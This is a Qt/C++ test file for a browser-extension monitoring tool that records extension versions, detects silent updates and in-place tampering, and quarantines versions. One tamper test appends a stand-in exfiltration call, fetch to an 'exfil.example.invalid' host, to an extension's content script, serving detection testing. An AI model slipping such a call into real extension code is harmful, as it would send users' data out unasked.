#include <QTemporaryDir>
#include <QtTest>

#include <QSqlDatabase>
#include <QSqlQuery>

#include "core/actions.h"
#include "core/blobstore.h"
#include "core/database.h"
#include "core/discovery.h"
#include "core/hashing.h"
#include "core/inventory.h"
#include "core/scanner.h"
#include "testutil.h"

using namespace extwatch;

class TestInventory : public QObject {
    Q_OBJECT
private slots:
    void discoversProfilesFromLocalState() {
        QTemporaryDir tmp;
        testutil::makeFakeUserDataDir(tmp.path(), QStringLiteral("Profile 7"), QStringLiteral("1.0.0"));
        const QList<Profile> profiles = discoverProfiles(tmp.path());
        QCOMPARE(profiles.size(), 1);
        QCOMPARE(profiles.first().dirName, QStringLiteral("Profile 7"));
        QCOMPARE(profiles.first().displayName, QStringLiteral("Test Person"));

        const QList<DiscoveredBrowser> browsers =
            discoverBrowsers({{BrowserKind::Chrome, QStringLiteral("Chrome"), tmp.path()},
                              {BrowserKind::Brave, QStringLiteral("Brave"), tmp.path() + QStringLiteral("/nope")}});
        QCOMPARE(browsers.size(), 1);
        QCOMPARE(browsers.first().profiles.size(), 1);
    }

    void inventoryJoinsPrefsAndDisk() {
        QTemporaryDir tmp;
        const QString profilePath =
            testutil::makeFakeUserDataDir(tmp.path(), QStringLiteral("Default"), QStringLiteral("1.0.0"));
        const ProfileInventory inv = inventoryProfile({QStringLiteral("Default"), QStringLiteral("Test Person"), profilePath});
        QVERIFY(inv.warnings.isEmpty());
        QCOMPARE(inv.extensions.size(), 1);  // the component extension is filtered out
        const InstalledExtension& ext = inv.extensions.first();
        QCOMPARE(ext.id, testutil::fixtureExtensionId());
        QCOMPARE(ext.displayName(), QStringLiteral("Screenshot Tool"));
        QCOMPARE(ext.activeVersion(), QStringLiteral("1.0.0"));
        QVERIFY(ext.enabled());
        QVERIFY(!ext.unpacked());
        QCOMPARE(ext.versions.size(), 1);
        QVERIFY(ext.versions.first().isActive);
        QVERIFY(ext.versions.first().keyMatchesId);
        QVERIFY(ext.versions.first().hasWebstoreMetadata);
    }

    void pendingVersionDirIsListedButNotActive() {
        QTemporaryDir tmp;
        const QString profilePath =
            testutil::makeFakeUserDataDir(tmp.path(), QStringLiteral("Default"), QStringLiteral("1.0.0"));
        testutil::simulateUpdate(profilePath, QStringLiteral("1.1.0"), /*switchPrefs=*/false);
        const ProfileInventory inv = inventoryProfile({QStringLiteral("Default"), QStringLiteral("Test Person"), profilePath});
        const InstalledExtension& ext = inv.extensions.first();
        QCOMPARE(ext.versions.size(), 2);
        QCOMPARE(ext.versions.first().version, QStringLiteral("1.1.0"));  // newest first
        QVERIFY(!ext.versions.first().isActive);
        QVERIFY(ext.versions.last().isActive);
        QCOMPARE(ext.activeVersion(), QStringLiteral("1.0.0"));
    }

    void compareVersionsIsNumeric() {
        QVERIFY(compareVersions(QStringLiteral("1.10.0"), QStringLiteral("1.9.0")) > 0);
        QVERIFY(compareVersions(QStringLiteral("2.0"), QStringLiteral("2.0.0")) < 0);
        QCOMPARE(compareVersions(QStringLiteral("1.2.3"), QStringLiteral("1.2.3")), 0);
    }

    void scanRecordsBaselineThenUpdate() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString dataDir = tmp.path() + QStringLiteral("/data");
        const QString profilePath =
            testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));

        ScanOptions opts;
        opts.dataDir = dataDir;
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};

        // First scan: baseline.
        ScanResult first = runScan(opts);
        QVERIFY2(first.warnings.isEmpty(), qPrintable(first.warnings.join(u'\n')));
        QCOMPARE(first.extensionCount(), 1);
        QCOMPARE(first.events.size(), 1);
        QCOMPARE(first.events.first().kind, QStringLiteral("baseline"));
        QCOMPARE(first.events.first().toVersion, QStringLiteral("1.0.0"));
        const VersionReport& v0 = first.browsers.first().profiles.first().extensions.first().versions.first();
        QVERIFY(v0.newlySeen);
        QVERIFY(v0.fileCount > 5);

        // Blobs exist for every file.
        {
            Database db;
            QVERIFY(db.open(databasePath(dataDir)));
            const QList<ExtensionRow> rows = db.extensionsByExtId(testutil::fixtureExtensionId());
            QCOMPARE(rows.size(), 1);
            const QList<VersionRow> versions = db.versionsForExtension(rows.first().id);
            QCOMPARE(versions.size(), 1);
            QCOMPARE(versions.first().version, QStringLiteral("1.0.0"));
            const QList<FileEntry> files = db.filesForVersion(versions.first().id);
            QCOMPARE(files.size(), v0.fileCount);
            BlobStore blobs(dataDir);
            for (const FileEntry& f : files) {
                QVERIFY2(blobs.has(f.sha256), qPrintable(f.relPath));
            }
        }

        // Second scan with nothing changed: no events.
        ScanResult again = runScan(opts);
        QVERIFY(again.events.isEmpty());

        // Silent update to 1.2.0.
        testutil::simulateUpdate(profilePath, QStringLiteral("1.2.0"));
        ScanResult updated = runScan(opts);
        QCOMPARE(updated.events.size(), 1);
        const ScanEvent& ev = updated.events.first();
        QCOMPARE(ev.kind, QStringLiteral("updated"));
        QCOMPARE(ev.fromVersion, QStringLiteral("1.0.0"));
        QCOMPARE(ev.toVersion, QStringLiteral("1.2.0"));
        QVERIFY(ev.eventRowId.has_value());
        QVERIFY(ev.fromVersionRowId.has_value());
        QVERIFY(ev.toVersionRowId.has_value());

        // History reflects both versions and both events.
        {
            Database db;
            QVERIFY(db.open(databasePath(dataDir)));
            const QList<ExtensionRow> rows = db.extensionsByExtId(testutil::fixtureExtensionId());
            const QList<VersionRow> versions = db.versionsForExtension(rows.first().id);
            QCOMPARE(versions.size(), 2);
            QCOMPARE(rows.first().currentVersionId.value(), versions.last().id);
            const QList<EventRow> events = db.eventsForExtension(rows.first().id);
            QCOMPARE(events.size(), 2);
            QCOMPARE(events.last().kind, QStringLiteral("updated"));

            // Export the old version from blobs and check a file round-trips.
            BlobStore blobs(dataDir);
            const QString exportDir = tmp.path() + QStringLiteral("/export");
            QVERIFY(blobs.exportTree(db.filesForVersion(versions.first().id), exportDir));
            QVERIFY(QFile::exists(exportDir + QStringLiteral("/manifest.json")));
            QCOMPARE(readManifest(exportDir).version, QStringLiteral("1.0.0"));
        }

        // JSON output has the expected top-level shape.
        const QJsonObject json = updated.toJson();
        QVERIFY(json.contains(QStringLiteral("extwatch")));
        QCOMPARE(json.value(QStringLiteral("browsers")).toArray().size(), 1);
        QCOMPARE(json.value(QStringLiteral("events")).toArray().size(), 1);
    }

    void scanRecordsDisableAndPending() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString dataDir = tmp.path() + QStringLiteral("/data");
        const QString profilePath =
            testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
        ScanOptions opts;
        opts.dataDir = dataDir;
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        runScan(opts);

        // A downloaded-but-not-activated version shows up as pending.
        testutil::simulateUpdate(profilePath, QStringLiteral("1.1.0"), /*switchPrefs=*/false);
        ScanResult pending = runScan(opts);
        QCOMPARE(pending.events.size(), 1);
        QCOMPARE(pending.events.first().kind, QStringLiteral("pending_version"));
        QCOMPARE(pending.events.first().toVersion, QStringLiteral("1.1.0"));

        // Disabling the extension produces a "disabled" event.
        const QString prefsPath = profilePath + QStringLiteral("/Secure Preferences");
        QJsonObject prefs = testutil::readJson(prefsPath);
        QJsonObject extensions = prefs.value(QStringLiteral("extensions")).toObject();
        QJsonObject settings = extensions.value(QStringLiteral("settings")).toObject();
        QJsonObject record = settings.value(testutil::fixtureExtensionId()).toObject();
        record.insert(QStringLiteral("disable_reasons"), QJsonArray{1});
        settings.insert(testutil::fixtureExtensionId(), record);
        extensions.insert(QStringLiteral("settings"), settings);
        prefs.insert(QStringLiteral("extensions"), extensions);
        testutil::writeJson(prefsPath, prefs);
        ScanResult disabled = runScan(opts);
        QCOMPARE(disabled.events.size(), 1);
        QCOMPARE(disabled.events.first().kind, QStringLiteral("disabled"));
    }

    void blobStoreRejectsBytesThatDoNotMatchTheHash() {
        QTemporaryDir tmp;
        BlobStore blobs(tmp.path());
        QFile f(tmp.path() + QStringLiteral("/a.js"));
        QVERIFY(f.open(QIODevice::WriteOnly));
        f.write("console.log(1);\n");
        f.close();
        bool ok = false;
        const QByteArray real = sha256File(f.fileName(), &ok);
        QVERIFY(ok);
        QByteArray wrong = real;
        wrong[0] = static_cast<char>(wrong[0] ^ 0x01);
        QString error;
        QVERIFY(!blobs.put(f.fileName(), wrong, &error));  // the file no longer matches: refused
        QVERIFY(error.contains(QStringLiteral("changed")));
        QVERIFY(!blobs.has(wrong));
        QVERIFY(blobs.put(f.fileName(), real, &error));
        QVERIFY(blobs.verify(real));
        QCOMPARE(blobs.allBlobs().size(), 1);
    }

    void freshlyWrittenVersionDirectoriesWaitToSettle() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString dataDir = tmp.path() + QStringLiteral("/data");
        const QString profilePath = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
        // Copies keep the fixture's old timestamps; make one file look freshly written.
        QFile fresh(profilePath + QStringLiteral("/Extensions/") + testutil::fixtureExtensionId() + QStringLiteral("/1.0.0_0/sw.js"));
        QVERIFY(fresh.open(QIODevice::ReadWrite));
        QVERIFY(fresh.setFileTime(QDateTime::currentDateTime(), QFileDevice::FileModificationTime));
        fresh.close();
        ScanOptions opts;
        opts.dataDir = dataDir;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        opts.settleSeconds = 60;  // written seconds ago: still "being written"
        opts.settleRetries = 0;
        const ScanResult first = runScan(opts);
        QVERIFY(first.needsRescan);
        QVERIFY(first.events.isEmpty());  // nothing archived yet
        QVERIFY(!first.browsers.first().profiles.first().extensions.first().versions.first().settled);
        opts.settleSeconds = 0;
        const ScanResult second = runScan(opts);
        QCOMPARE(second.events.size(), 1);
        QCOMPARE(second.events.first().kind, QStringLiteral("baseline"));
    }

    void unchangedTreesReuseTheStoredFingerprint() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
        ScanOptions opts;
        opts.dataDir = tmp.path() + QStringLiteral("/data");
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        runScan(opts);
        const ScanResult again = runScan(opts);
        const VersionReport& v = again.browsers.first().profiles.first().extensions.first().versions.first();
        QVERIFY(v.reused);
        QVERIFY(!v.treeHash.isEmpty());
    }

    void sameVersionDifferentBytesIsItsOwnEvent() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString profilePath = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
        ScanOptions opts;
        opts.dataDir = tmp.path() + QStringLiteral("/data");
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        runScan(opts);
        // Tamper with the installed files without touching the version.
        QFile content(profilePath + QStringLiteral("/Extensions/") + testutil::fixtureExtensionId() + QStringLiteral("/1.0.0_0/content.js"));
        QVERIFY(content.open(QIODevice::Append));
        content.write("\nfetch('https://exfil.example.invalid/');\n");
        content.close();
        const ScanResult tampered = runScan(opts);
        QCOMPARE(tampered.events.size(), 1);
        QCOMPARE(tampered.events.first().kind, QStringLiteral("modified_in_place"));
        QCOMPARE(tampered.events.first().toVersion, QStringLiteral("1.0.0"));
        QVERIFY(tampered.events.first().summary().contains(QStringLiteral("without a version change")));
    }

    void pendingVersionIsReportedOnTheFirstScanToo() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString profilePath = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
        testutil::simulateUpdate(profilePath, QStringLiteral("1.1.0"), /*switchPrefs=*/false);
        ScanOptions opts;
        opts.dataDir = tmp.path() + QStringLiteral("/data");
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        const ScanResult first = runScan(opts);
        QStringList kinds;
        for (const ScanEvent& e : first.events) kinds.append(e.kind);
        QVERIFY(kinds.contains(QStringLiteral("baseline")));
        QVERIFY(kinds.contains(QStringLiteral("pending_version")));
    }

    void schemaOneDatabasesAreMigrated() {
        QTemporaryDir tmp;
        const QString path = tmp.path() + QStringLiteral("/old.sqlite");
        {
            QSqlDatabase old = QSqlDatabase::addDatabase(QStringLiteral("QSQLITE"), QStringLiteral("legacy"));
            old.setDatabaseName(path);
            QVERIFY(old.open());
            QSqlQuery q(old);
            QVERIFY(q.exec(QStringLiteral("CREATE TABLE meta(key TEXT PRIMARY KEY, value TEXT)")));
            QVERIFY(q.exec(QStringLiteral("INSERT INTO meta VALUES('schema_version','1')")));
            QVERIFY(q.exec(QStringLiteral("CREATE TABLE browsers(id INTEGER PRIMARY KEY, kind TEXT NOT NULL, user_data_dir TEXT NOT NULL UNIQUE, display_name TEXT, first_seen INTEGER NOT NULL, last_seen INTEGER NOT NULL)")));
            QVERIFY(q.exec(QStringLiteral("CREATE TABLE profiles(id INTEGER PRIMARY KEY, browser_id INTEGER NOT NULL, dir_name TEXT NOT NULL, display_name TEXT, first_seen INTEGER NOT NULL, last_seen INTEGER NOT NULL, UNIQUE(browser_id, dir_name))")));
            QVERIFY(q.exec(QStringLiteral("CREATE TABLE extensions(id INTEGER PRIMARY KEY, profile_id INTEGER NOT NULL, ext_id TEXT NOT NULL, name TEXT, location INTEGER, from_webstore INTEGER, enabled INTEGER, first_seen INTEGER NOT NULL, last_seen INTEGER NOT NULL, current_version_id INTEGER, UNIQUE(profile_id, ext_id))")));
            QVERIFY(q.exec(QStringLiteral("CREATE TABLE versions(id INTEGER PRIMARY KEY, extension_id INTEGER NOT NULL, version TEXT NOT NULL, dir_name TEXT NOT NULL, tree_hash TEXT NOT NULL, first_seen INTEGER NOT NULL, last_seen INTEGER NOT NULL, activated_at INTEGER, manifest_json TEXT, signature_json TEXT, file_count INTEGER, bytes INTEGER, key_matches_id INTEGER, has_webstore_metadata INTEGER, UNIQUE(extension_id, tree_hash))")));
            QVERIFY(q.exec(QStringLiteral("INSERT INTO browsers VALUES(1,'chrome','/x','Chrome',1,1)")));
            QVERIFY(q.exec(QStringLiteral("INSERT INTO profiles VALUES(1,1,'Default','Default',1,1)")));
            QVERIFY(q.exec(QStringLiteral("INSERT INTO extensions VALUES(1,1,'abcdefghijklmnopabcdefghijklmnop','Old',1,1,1,1,1,NULL)")));
            QVERIFY(q.exec(QStringLiteral("INSERT INTO versions VALUES(1,1,'1.0','1.0_0','ab',1,1,NULL,'{}','',1,1,1,1)")));
            old.close();
        }
        QSqlDatabase::removeDatabase(QStringLiteral("legacy"));
        Database db;
        QString error;
        QVERIFY2(db.open(path, &error), qPrintable(error));
        QCOMPARE(db.schemaVersion(), Database::kSchemaVersion);
        const QList<VersionRow> versions = db.versionsForExtension(1);
        QCOMPARE(versions.size(), 1);
        QCOMPARE(versions.first().state, QStringLiteral("complete"));
        QVERIFY(versions.first().statFingerprint.isEmpty());
        QVERIFY(db.setVersionFingerprint(1, QStringLiteral("1:1:1")));
        QuarantineRow q;
        q.id = QStringLiteral("test-q");
        q.extensionId = 1;
        q.extId = QStringLiteral("abcdefghijklmnopabcdefghijklmnop");
        q.originalPath = QStringLiteral("/x/Default/Extensions/a/1.0_0");
        q.quarantinePath = QStringLiteral("/data/quarantine/test-q");
        q.createdAt = 1;
        q.state = QStringLiteral("quarantined");
        QVERIFY(db.insertQuarantine(q));
        QCOMPARE(db.quarantinesForExtension(1).size(), 1);
    }

    void deletedProfilesGetRemovalEvents() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString profilePath = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
        ScanOptions opts;
        opts.dataDir = tmp.path() + QStringLiteral("/data");
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        QCOMPARE(runScan(opts).events.size(), 1);
        // The browser deletes the profile: directory and Local State entry are both gone.
        QVERIFY(QDir(profilePath).removeRecursively());
        QJsonObject localState = testutil::readJson(userData + QStringLiteral("/Local State"));
        QJsonObject profile = localState.value(QStringLiteral("profile")).toObject();
        profile.insert(QStringLiteral("info_cache"), QJsonObject());
        localState.insert(QStringLiteral("profile"), profile);
        QVERIFY(testutil::writeJson(userData + QStringLiteral("/Local State"), localState));
        // A scan restricted to one profile must not touch the others; a full scan reconciles.
        ScanOptions restricted = opts;
        restricted.onlyProfile = QStringLiteral("Other");
        QVERIFY(runScan(restricted).events.isEmpty());
        const ScanResult full = runScan(opts);
        QStringList kinds;
        for (const ScanEvent& e : full.events) kinds.append(e.kind);
        QVERIFY2(full.events.size() == 1, qPrintable(QStringLiteral("events: [%1] warnings: [%2]").arg(kinds.join(u','), full.warnings.join(u';'))));
        QCOMPARE(full.events.first().kind, QStringLiteral("removed"));
        QCOMPARE(full.events.first().extId, testutil::fixtureExtensionId());
        QVERIFY(runScan(opts).events.isEmpty());  // reported once, not on every later scan
    }

    void versionRefsAreExplicitAboutAmbiguity() {
        QTemporaryDir tmp;
        Database db;
        QString error;
        QVERIFY2(db.open(tmp.path() + QStringLiteral("/db.sqlite"), &error), qPrintable(error));
        const qint64 browser = db.upsertBrowser(QStringLiteral("chrome"), QStringLiteral("/x"), QStringLiteral("Chrome"), 1);
        const qint64 profile = db.upsertProfile(browser, QStringLiteral("Default"), QStringLiteral("Default"), 1);
        const qint64 extId = db.upsertExtension(profile, QStringLiteral("abcdefghijklmnopabcdefghijklmnop"), QStringLiteral("Old"), 1, true, true, 1);
        auto version = [&](const QString& v, const QString& hash) {
            VersionRow row;
            row.extensionId = extId;
            row.version = v;
            row.dirName = v + QStringLiteral("_0");
            row.treeHash = hash;
            row.firstSeen = row.lastSeen = 1;
            QVERIFY(db.insertVersion(row) > 0);
        };
        version(QStringLiteral("1.0"), QStringLiteral("aaaa1111"));
        version(QStringLiteral("1.0"), QStringLiteral("aaaa2222"));  // same version, different bytes
        version(QStringLiteral("2.0"), QStringLiteral("bbbb0000"));
        QString note;
        QVERIFY(resolveVersionRef(db, extId, QStringLiteral("2.0"), &note));
        QVERIFY(note.isEmpty());
        const auto newest = resolveVersionRef(db, extId, QStringLiteral("1.0"), &note);
        QVERIFY(newest);
        QCOMPARE(newest->treeHash, QStringLiteral("aaaa2222"));
        QVERIFY2(note.contains(QStringLiteral("using the newest")), qPrintable(note));
        note.clear();
        QVERIFY(!resolveVersionRef(db, extId, QStringLiteral("1.0@aaaa"), &note));  // matches both
        QVERIFY2(note.contains(QStringLiteral("matches 2 snapshots")), qPrintable(note));
        note.clear();
        const auto exact = resolveVersionRef(db, extId, QStringLiteral("@aaaa1"), &note);
        QVERIFY(exact);
        QCOMPARE(exact->treeHash, QStringLiteral("aaaa1111"));
        QVERIFY(note.isEmpty());
        QVERIFY(!resolveVersionRef(db, extId, QStringLiteral("3.0"), &note));
    }

    void fingerprintSeesPerFileChanges() {
        QTemporaryDir tmp;
        auto write = [&](const QString& name, const QByteArray& bytes) {
            QFile f(tmp.path() + u'/' + name);
            QVERIFY(f.open(QIODevice::WriteOnly | QIODevice::Truncate));
            f.write(bytes);
        };
        write(QStringLiteral("a.js"), "aaaa");
        write(QStringLiteral("b.js"), "bb");
        const QString before = directoryFingerprint(tmp.path());
        // Swap the sizes: file count, total bytes and newest mtime can all stay the same.
        write(QStringLiteral("a.js"), "aa");
        write(QStringLiteral("b.js"), "bbbb");
        const QString after = directoryFingerprint(tmp.path());
        QVERIFY(before != after);
        QCOMPARE(directoryFingerprint(tmp.path()), after);
    }

    void forcedHashIgnoresStoredFingerprints() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
        ScanOptions opts;
        opts.dataDir = tmp.path() + QStringLiteral("/data");
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        runScan(opts);
        QVERIFY(runScan(opts).browsers.first().profiles.first().extensions.first().versions.first().reused);
        opts.forceHash = true;
        QVERIFY(!runScan(opts).browsers.first().profiles.first().extensions.first().versions.first().reused);
    }

    void quarantineIsScopedToOneProfileAndRestoresToItsOrigin() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString dataDir = tmp.path() + QStringLiteral("/data");
        // The same extension and version in two profiles.
        const QString profileA = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
        const QString profileB = testutil::makeFakeUserDataDir(userData, QStringLiteral("Profile 2"), QStringLiteral("1.0.0"));
        ScanOptions opts;
        opts.dataDir = dataDir;
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        runScan(opts);
        Database db;
        QVERIFY(db.open(databasePath(dataDir)));
        const QList<ExtensionRow> rows = db.extensionsByExtId(testutil::fixtureExtensionId());
        QCOMPARE(rows.size(), 2);
        const ExtensionRow& rowB = rows.last();
        const std::optional<ProfileRow> profile = db.profileById(rowB.profileId);
        QVERIFY(profile);
        QCOMPARE(profile->dirName, QStringLiteral("Profile 2"));
        const VersionRow version = db.versionById(*rowB.currentVersionId).value();
        QuarantineRequest req;
        req.extensionId = rowB.id;
        req.extId = rowB.extId;
        req.browserKind = QStringLiteral("chrome");
        req.userDataDir = userData;
        req.profileDir = profile->dirName;
        req.version = version.version;
        req.dirName = version.dirName;
        req.treeHash = version.treeHash;
        req.versionDirPath = profileB + QStringLiteral("/Extensions/") + rowB.extId + u'/' + version.dirName;
        const ActionResult q = quarantineVersion(db, dataDir, req);
        QVERIFY2(q.ok, qPrintable(q.message));
        QVERIFY(!QFileInfo::exists(req.versionDirPath));                                            // gone from Profile 2
        QVERIFY(QFileInfo(profileA + QStringLiteral("/Extensions/") + rowB.extId + u'/' + version.dirName).isDir());  // Default untouched
        QCOMPARE(db.quarantinesForExtension(rows.first().id).size(), 0);  // not attributed to the other profile
        QCOMPARE(db.quarantinesForExtension(rowB.id).size(), 1);
        const ActionResult r = restoreQuarantine(db, dataDir, q.quarantineId);
        QVERIFY2(r.ok, qPrintable(r.message));
        QVERIFY(QFileInfo(req.versionDirPath).isDir());  // back exactly where it came from
        QCOMPARE(db.quarantineById(q.quarantineId)->state, QStringLiteral("restored"));
        QVERIFY(!restoreQuarantine(db, dataDir, q.quarantineId).ok);  // cannot restore twice
    }
};

QTEST_GUILESS_MAIN(TestInventory)
#include "test_inventory.moc"
